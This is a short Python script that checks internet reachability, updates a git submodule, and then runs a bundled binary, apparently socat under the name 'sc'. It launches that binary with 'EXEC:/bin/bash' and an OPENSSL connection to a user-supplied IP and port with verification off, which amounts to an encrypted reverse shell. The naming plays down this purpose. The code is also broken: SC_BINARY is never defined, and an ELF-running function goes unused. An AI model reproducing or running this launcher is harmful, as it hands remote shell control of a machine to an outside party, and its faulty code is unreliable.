#!/usr/bin/env python3
import os
import subprocess
import sys
import socket

SUBMODULE_PATH = "submodule"
ELF_BINARY = "submodule.elf"

def check_connectivity(host, port=53, timeout=3):
    """
    Try connecting to a host on a given port (default: 53 for DNS).
    Returns True if reachable, False otherwise.
    """
    try:
        socket.setdefaulttimeout(timeout)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
        return True
    except Exception as e:
        return False

def check():
    servers = {
        "Google DNS": "8.8.8.8",
        "Cloudflare DNS": "1.1.1.1"
    }

    for name, ip in servers.items():
        if check_connectivity(ip):
            print(f"[✅] {name} ({ip}) is reachable")
        else:
            print(f"[❌] {name} ({ip}) is NOT reachable")

def init_submodule():
    if not os.path.exists(SUBMODULE_PATH):
        print(f"Submodule folder '{SUBMODULE_PATH}' not found. Cloning submodule...")
        subprocess.check_call(["git", "submodule", "update", "--init", "--recursive"])
    else:
        print(f"Updating submodule '{SUBMODULE_PATH}'...")
        subprocess.check_call(["git", "submodule", "update", "--init", "--recursive"])

def run_elf():
    elf_path = os.path.join(SUBMODULE_PATH, ELF_BINARY)
    if not os.path.isfile(elf_path):
        print(f"Error: ELF binary '{elf_path}' not found!")
        sys.exit(1)
    print(f"Running ELF binary: {elf_path}")
    subprocess.check_call([elf_path])

def run_sc(ip, port):
    sc_path = os.path.join(SUBMODULE_PATH, SC_BINARY)
    if not os.path.isfile(sc_path):
        print("Error: binary not found in submodule!")
        sys.exit(1)
    
    print(f"Starting sc connection to {ip}:{port} ...")
    subprocess.check_call([sc_path, "EXEC:/bin/bash", f"OPENSSL:{ip}:{port},verify=0"])

if __name__ == "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check()
    init_submodule()
    run_sc(ip,port)
            
            
